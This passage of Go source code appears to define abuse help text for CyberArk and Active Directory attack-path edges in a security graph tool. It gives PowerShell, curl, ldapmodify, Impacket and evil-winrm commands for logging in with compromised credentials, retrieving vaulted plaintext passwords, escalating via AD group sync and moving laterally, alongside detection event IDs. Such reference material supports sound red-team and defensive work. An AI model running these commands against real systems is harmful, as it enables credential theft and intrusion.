			"This edge bridges the AD and CyberArk attack surfaces: compromising the AD user grants full access to all CyberArk safes and accounts the Vault user is a member of.",
		WindowsAbuse: "After compromising the AD user account (via Kerberoasting, AS-REP roasting, credential theft, pass-the-hash, etc.), " +
			"authenticate to CyberArk PVWA using LDAP authentication:\n\n" +
			"$pvwaURL = 'https://<pvwa>'\n" +
			"# Authenticate using compromised AD credentials (LDAP auth method)\n" +
			"$body = @{username = 'DOMAIN\\<user>'; password = '<compromised-password>'} | ConvertTo-Json\n" +
			"$token = Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Auth/LDAP/Logon\" `\n" +
			"    -Method POST -Body $body -ContentType 'application/json'\n\n" +
			"# Now use $token to access all CyberArk resources of the synced Vault user\n" +
			"$headers = @{Authorization = \"Bearer $token\"}\n" +
			"# List accessible safes\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Safes\" -Headers $headers\n" +
			"# Retrieve credentials from accessible accounts\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" `\n" +
			"    -Method POST -Headers $headers -Body '{}' -ContentType 'application/json'",
		LinuxAbuse: "Authenticate to PVWA using compromised AD credentials via LDAP auth:\n\n" +
			"TOKEN=$(curl -s -X POST \"https://<pvwa>/PasswordVault/API/Auth/LDAP/Logon\" \\\n" +
			"  -H \"Content-Type: application/json\" \\\n" +
			"  -d '{\"username\":\"DOMAIN\\\\<user>\",\"password\":\"<compromised-password>\"}' | tr -d '\"')\n\n" +
			"# List accessible safes\n" +
			"curl -s \"https://<pvwa>/PasswordVault/API/Safes\" -H \"Authorization: Bearer $TOKEN\"\n\n" +
			"# Retrieve credentials from accessible accounts\n" +
			"curl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" \\\n" +
			"  -H \"Authorization: Bearer $TOKEN\" \\\n" +
			"  -H \"Content-Type: application/json\" -d '{}'",
		OpsecNotes: "LDAP-based authentication to CyberArk PVWA generates login events in both Active Directory " +
			"(Kerberos TGT/TGS requests or NTLM authentication — Event IDs 4768, 4769, 4776) and in the CyberArk Vault audit trail (login event under the Vault username). " +
			"Failed authentication attempts may trigger AD account lockout if threshold policies are configured. " +
			"The CyberArk PVWA web application firewall may also log and alert on unusual authentication patterns.",
		References: []string{
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/ldap-integration.htm",
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/configuring-ldap-authentication.htm",
		},
	},

	"CyberArk_SyncsToGroup": {
		Description: "The source Active Directory group is synchronized to the target CyberArk Vault group via LDAP directory integration. " +
			"AD group membership changes automatically propagate to CyberArk group membership after each LDAP sync cycle, " +
			"meaning that adding an account to the AD group grants it all CyberArk safe permissions assigned to the corresponding Vault group — " +
			"without making any direct changes inside CyberArk. This is a stealthy privilege escalation path through AD group manipulation.",
		WindowsAbuse: "Add a compromised or controlled AD user to the synchronized AD group to inherit the CyberArk group's safe permissions:\n\n" +
			"# Add user to the AD group (requires AD permissions to modify the group)\n" +
			"Add-ADGroupMember -Identity '<AD-Group-Name>' -Members '<compromised-user>'\n\n" +
			"# After the next CyberArk LDAP sync, the user will have all safe permissions of the CyberArk group\n" +
			"# LDAP sync interval is configurable — check CyberArk LDAP integration settings\n" +
			"# Force sync (if you have PVWA admin access):\n" +
			"$pvwaURL = 'https://<pvwa>'\n" +
			"$headers = @{Authorization = \"Bearer $adminToken\"}\n" +
			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/WebServices/PIMServices.svc/Users/SyncFromDirectory\" `\n" +
			"    -Method POST -Headers $headers",
		LinuxAbuse: "Add a user to the AD group via LDAP modification or Samba tools:\n\n" +
			"# Using net rpc (requires credentials for a group admin)\n" +
			"net rpc group addmem '<AD-Group-Name>' '<compromised-user>' -U '<admin-user>' -S '<dc-host>'\n\n" +
			"# Using ldapmodify\n" +
			"ldapmodify -x -H ldap://<dc-host> -D 'CN=admin,DC=domain,DC=com' -w '<password>' << EOF\n" +
			"dn: CN=<AD-Group-Name>,OU=Groups,DC=domain,DC=com\n" +
			"changetype: modify\n" +
			"add: member\n" +
			"member: CN=<compromised-user>,OU=Users,DC=domain,DC=com\n" +
			"EOF",
		OpsecNotes: "AD group membership changes are logged in Active Directory security events: " +
			"Event ID 4728 (member added to global security group), 4732 (member added to local security group), or 4756 (member added to universal security group). " +
			"CyberArk LDAP sync has a configurable interval (often 5–60 minutes) — the privilege change may not take effect immediately in CyberArk. " +
			"The corresponding CyberArk permission change may not generate a Vault audit event until the sync occurs, " +
			"creating a window where the AD change exists but CyberArk access has not yet been updated.",
		References: []string{
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/ldap-integration.htm",
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/configuring-directory-mappings.htm",
		},
	},
	"CyberArk_SyncsToADUser": {
		Description: "The source CyberArk account stores credentials for the target Active Directory user account. " +
			"This relationship is inferred: the account's stored username matches an AD sAMAccountName or UPN in a target domain. " +
			"Retrieving this credential from CyberArk yields the plaintext password for the AD user, enabling direct AD authentication and lateral movement across the domain. " +
			"This is a cross-domain bridge edge from the CyberArk attack surface into Active Directory.",
		WindowsAbuse: "Retrieve the AD user's plaintext password from CyberArk, then use it for AD lateral movement:\n\n" +
			"$pvwaURL = 'https://<pvwa>'\n" +
			"$headers = @{Authorization = \"Bearer $token\"}\n" +
			"# Retrieve the credential (requires retrieveAccounts permission on the safe)\n" +
			"$password = Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" `\n" +
			"    -Method POST -Headers $headers -Body '{}' -ContentType 'application/json'\n\n" +
			"# Use retrieved credentials for AD authentication\n" +
			"$secPass = ConvertTo-SecureString $password -AsPlainText -Force\n" +
			"$cred = New-Object System.Management.Automation.PSCredential('<domain>\\<adUser>', $secPass)\n\n" +
			"# Lateral movement options:\n" +
			"Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock {whoami; hostname}\n" +
			"Enter-PSSession -ComputerName <target> -Credential $cred\n" +
			"# Or use with PsExec, WMI, RDP, etc.",
		LinuxAbuse: "Retrieve the credential and use for AD lateral movement with Linux tools:\n\n" +
			"# Retrieve credential from CyberArk\n" +
			"PASSWORD=$(curl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" \\\n" +
			"  -H \"Authorization: Bearer $TOKEN\" \\\n" +
			"  -H \"Content-Type: application/json\" \\\n" +
			"  -d '{}' | tr -d '\"')\n\n" +
			"# Kerberos authentication\n" +
			"echo \"$PASSWORD\" | kinit <adUser>@<DOMAIN.COM>\n\n" +
			"# SMB / lateral movement with Impacket\n" +
			"impacket-psexec '<domain>/<adUser>:<password>@<target>'\n" +
			"impacket-wmiexec '<domain>/<adUser>:<password>@<target>'\n\n" +
			"# WinRM\n" +
			"evil-winrm -i <target> -u <adUser> -p \"$PASSWORD\" -d <domain>",
		OpsecNotes: "Password retrieval from CyberArk is logged in the Vault audit trail under the requesting user's identity. " +
			"Subsequent use of the retrieved credential in Active Directory generates standard Windows authentication events: " +
			"Event ID 4624 (successful logon), 4625 (failed logon), 4768/4769 (Kerberos TGT/TGS requests), or 4776 (NTLM authentication). " +
			"Unusual authentication from unexpected source IPs or outside normal business hours — correlated with a prior CyberArk retrieval event — may indicate credential exfiltration.",
		References: []string{
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/getaccountpasswordvalue.htm",
			"https://attack.mitre.org/techniques/T1555/",
		},
	},

	"CyberArk_CanConnect": {
		Description: "The source CyberArk account stores credentials valid for authenticating to the target Active Directory computer. " +
			"This relationship is inferred: the account's address field matches a hostname or IP that is part of the target domain. " +
			"If localUser is true in the edge properties, the account stores a local (non-domain) credential for that specific machine, potentially including local administrator access. " +
			"Retrieving this credential enables direct lateral movement to the target computer.",
		WindowsAbuse: "Retrieve the local or machine account credential from CyberArk, then connect to the target computer:\n\n" +
			"$pvwaURL = 'https://<pvwa>'\n" +
			"$headers = @{Authorization = \"Bearer $token\"}\n" +
			"# Retrieve the credential\n" +
			"$password = Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" `\n" +
			"    -Method POST -Headers $headers -Body '{}' -ContentType 'application/json'\n\n" +
			"$secPass = ConvertTo-SecureString $password -AsPlainText -Force\n" +
			"# For local account (localUser=true), prefix username with the machine name or '.'\n" +
			"$cred = New-Object System.Management.Automation.PSCredential('.\\<localUser>', $secPass)\n\n" +
			"# Connect to target computer\n" +
			"Invoke-Command -ComputerName <targetComputer> -Credential $cred -ScriptBlock {whoami}\n" +
			"# RDP\n" +
			"cmdkey /add:<targetComputer> /user:'.\\<localUser>' /pass:'<password>'\n" +
			"mstsc /v:<targetComputer>",
		LinuxAbuse: "Retrieve the credential and use Impacket or other tools for lateral movement:\n\n" +
			"# Retrieve credential\n" +
			"PASSWORD=$(curl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" \\\n" +
			"  -H \"Authorization: Bearer $TOKEN\" \\\n" +
			"  -H \"Content-Type: application/json\" \\\n" +
			"  -d '{}' | tr -d '\"')\n\n" +
			"# Impacket lateral movement (local admin account)\n" +
			"impacket-psexec './<localUser>:$PASSWORD@<targetComputer>'\n" +
			"impacket-smbexec './<localUser>:$PASSWORD@<targetComputer>'\n\n" +
			"# WinRM\n" +
			"evil-winrm -i <targetComputer> -u <localUser> -p \"$PASSWORD\"\n\n" +
			"# RDP\n" +
			"xfreerdp /v:<targetComputer> /u:<localUser> /p:\"$PASSWORD\"",
		OpsecNotes: "CyberArk password retrieval is logged in the Vault audit trail. " +
			"Subsequent connection to the target computer generates Windows Security events: Event ID 4624 (logon), 4648 (explicit credential logon). " +
			"Local administrator account usage is particularly visible in endpoint detection and response (EDR) solutions and may trigger privileged account alerts. " +
			"Pass-the-hash using the retrieved credential NTLM hash (if not rotating) may allow authentication without the plaintext password.",
		References: []string{
			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/getaccountpasswordvalue.htm",
			"https://attack.mitre.org/techniques/T1078/003/",
		},
	},
}
